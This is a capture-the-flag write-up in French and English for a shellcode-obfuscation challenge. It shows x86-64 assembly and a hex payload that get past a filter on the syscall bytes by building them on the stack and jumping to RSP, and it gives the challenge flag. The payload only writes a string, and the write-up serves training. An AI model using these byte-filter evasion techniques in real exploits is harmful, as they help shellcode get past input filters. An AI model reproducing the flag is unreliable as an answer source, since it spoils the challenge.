# Shellcode Obfuscation 2
## Write-up
### Solution (Français)
Ici les contraintes qui nous sont données sont de ne pas utiliser les bytes "\x05\x0f", qui sont les bytes pour faire un syscall. La difficultée viens du fait qu'on ne peux pas manipuler les bytes passées. Il faut donc trouver comment executer un syscall sans l'instruction syscall.

Utiliser int 0x80 ne fonctionne pas étant donnée qu'on est en 64bit

Une des façons de faire notre syscall est de stocker les bytes "\x05\x0f" et d'utiliser une instruction jmp pour ensuite faire notre syscall.

Comme on ne veut pas modifier nos registres précedents, on peut utiliser le registre RCX pour pousser notre code. 
On mov 0x04 et 0x0e(pour éviter d'avoir nos bytes interdits dans le payload) dans CH et CL respectivement pour avant des les incrémenter. 
On les pousse dans le stack et on peut ensuite les executer en sautant a RSP

Voici le code pour faire ça:
``` assembly
BITS 64
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x6e726f63706f50
xor [rsp], rax
push 1
pop rdi
push 8
pop rdx
mov rsi, rsp
push 1
pop rax

xor rcx,rcx
mov ch,0x04
inc ch
mov cl,0x0e
inc cl
push rcx
jmp rsp
```
La première partie setup le syscall pour write, et la deuxieme l'execute.

Payload: `\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x51\x6e\x71\x62\x6e\x73\x6f\x01\x48\x31\x04\x24\x6a\x01\x5f\x6a\x08\x5a\x48\x89\xe6\x6a\x01\x58\x48\x31\xc9\xb5\x04\xfe\xc5\xb1\x0e\xfe\xc1\x51\xff\xe4`

Flag: `flag-Q6Z9F7J1P8T3C4M2V7R9L1Y5X6W3K8N2`

### Solution (English)
Here the constraints that are given to us are not to use the bytes "\x05\x0f", which are the bytes to make a syscall. The difficulty comes from the fact that we cannot manipulate the bytes passed. So we have to find out how to execute a syscall without the syscall instruction.

Using int 0x80 does not work because we are in 64bit

One way to make our syscall is to store the bytes "\x05\x0f" and use a jmp instruction to then make our syscall.

Since we don't want to modify our previous registers, we can use the RCX register to push our code.
We mov 0x04 and 0x0e (to avoid having our forbidden bytes in the payload) into CH and CL respectively before incrementing them.
We push them into the stack and can then execute them by jumping to RSP

Here is the code to do this:
``` assembly
BITS 64
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x6e726f63706f50
xor [rsp], rax
push 1
pop rdi
push 8
pop rdx
mov rsi, rsp
push 1
pop rax

xor rcx,rcx
mov ch,0x04
inc ch
mov cl,0x0e
inc cl
push rcx
jmp rsp
```
The first part sets up the syscall for write, and the second executes it.

Payload: `\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x51\x6e\x71\x62\x6e\x73\x6f\x01\x48\x31\x04\x24\x6a\x01\x5f\x6a\x08\x5a\x48\x89\xe6\x6a\x01\x58\x48\x31\xc9\xb5\x04\xfe\xc5\xb1\x0e\xfe\xc1\x51\xff\xe4`

Flag: `flag-Q6Z9F7J1P8T3C4M2V7R9L1Y5X6W3K8N2`